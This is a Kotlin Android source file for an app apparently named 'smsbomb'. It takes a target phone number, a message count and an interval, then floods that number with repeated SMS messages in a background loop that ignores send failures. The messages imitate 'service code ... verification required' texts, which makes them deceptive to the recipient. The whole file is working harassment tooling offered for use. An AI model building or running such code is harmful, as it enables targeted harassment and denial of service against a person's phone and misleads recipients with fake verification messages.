package com.android.smsbomb

import android.Manifest
import android.app.Activity
import android.content.pm.PackageManager
import android.os.Bundle
import android.telephony.SmsManager
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.Toast
import androidx.core.app.ActivityCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity : Activity() {

    private val smsManager: SmsManager by lazy { SmsManager.getDefault() }
    private val scope = CoroutineScope(Dispatchers.IO)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 48, 48, 48)
        }

        val targetInput = EditText(this).apply {
            hint = "target number (+98...)"
            layout.addView(this)
        }

        val countInput = EditText(this).apply {
            hint = "message count"
            layout.addView(this)
        }

        val intervalInput = EditText(this).apply {
            hint = "interval ms"
            setText("1500")
            layout.addView(this)
        }

        val sendButton = Button(this).apply {
            text = "START"
            layout.addView(this)
        }

        setContentView(layout)

        if (ActivityCompat.checkSelfPermission(
                this, Manifest.permission.SEND_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this, arrayOf(Manifest.permission.SEND_SMS), 1
            )
        }

        sendButton.setOnClickListener {
            val target = targetInput.text.toString().trim()
            val count = countInput.text.toString().toIntOrNull() ?: 0
            val interval = intervalInput.text.toString().toLongOrNull() ?: 1500L

            if (target.isEmpty() || count <= 0) {
                Toast.makeText(this, "invalid input", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            launchBomb(target, count, interval)
        }
    }

    private fun launchBomb(target: String, count: Int, intervalMs: Long) {
        scope.launch {
            repeat(count) { index ->
                try {
                    val payload = buildMessage(index)
                    val parts = smsManager.divideMessage(payload)
                    smsManager.sendMultipartTextMessage(
                        target, null, parts, null, null
                    )
                } catch (e: Exception) {
                    // continue on single dispatch failure
                }
                delay(intervalMs)
            }
            runOnUiThread {
                Toast.makeText(
                    this@MainActivity,
                    "dispatch complete",
                    Toast.LENGTH_SHORT
                ).show()
            }
        }
    }

    private fun buildMessage(index: Int): String {
        val token = (System.currentTimeMillis() + index).toString(36)
        return "service code $token - verification required"
    }
}
